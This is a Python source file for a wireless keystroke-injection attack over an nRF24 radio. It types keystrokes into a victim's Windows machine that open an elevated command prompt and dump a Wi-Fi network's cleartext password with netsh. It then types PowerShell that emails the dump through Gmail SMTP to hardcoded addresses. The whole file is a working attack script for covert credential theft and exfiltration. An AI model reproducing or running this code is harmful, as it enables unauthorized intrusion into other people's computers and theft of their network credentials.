from __future__ import print_function, absolute_import
import time
from tools import Scanner
from lib import nrf24_reset, nrf24, payload_keys
from attacks import add_payload


class wifi_attack:

    def __init__(self, address, radio=nrf24.nrf24(0)):
        self.radio = radio
        self.address = address
        self.payloads_list = []

    def init_list(self):
        self.payloads_list.append(payload_keys.payload_keys('init'))
        add_payload.KeyPL(self.payloads_list, 'hideDesktop')
        add_payload.wait(self.payloads_list, 1)
        add_payload.KeyPL(self.payloads_list, 'run')
        add_payload.wait(self.payloads_list, 1)
        add_payload.StringPL(self.payloads_list, 'cmd')
        add_payload.wait(self.payloads_list, 2)
        add_payload.KeyPL(self.payloads_list, 'ctrl+shift+enter')
        add_payload.wait(self.payloads_list, 1)
        add_payload.KeyPL(self.payloads_list, 'TAB')
        add_payload.KeyPL(self.payloads_list, 'TAB')
        add_payload.wait(self.payloads_list, 1)
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.wait(self.payloads_list, 1)
        add_payload.StringPL(self.payloads_list, 'netsh wlan show profile "bara" key=clear ')
        add_payload.StringPL(self.payloads_list, '>c:\\WINDOWS\\system32\\log.txt')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.wait(self.payloads_list, 2)
        add_payload.StringPL(self.payloads_list, 'powershell')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.wait(self.payloads_list, 2)
        add_payload.StringPL(self.payloads_list, "$SMTPServer = 'smtp.gmail.com'")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, '$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, '$SMTPInfo.EnableSsl = $true')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential(YOUR EMAIL', 'YOUR PASSWORD');")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, '$ReportEmail = New-Object System.Net.Mail.MailMessage')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.From = 'm7mdmajde97@gmail.com'")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.To.Add('oday.shibli.99@gmail.com')")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.Subject = 'WiFi'")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.Body = 'The log is attached!' ")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, "$ReportEmail.Attachments.Add('log.txt')")
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, '$SMTPInfo.Send($ReportEmail)')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, 'exit')
        add_payload.KeyPL(self.payloads_list, 'ENTER')
        add_payload.StringPL(self.payloads_list, 'Delete log.txt and exit')
        add_payload.KeyPL(self.payloads_list, 'ENTER')

    def run(self):
        self.init_list()
        for i in self.payloads_list:
            self.radio.transmit_payload(i)
            time.sleep(35 / 1000.0)
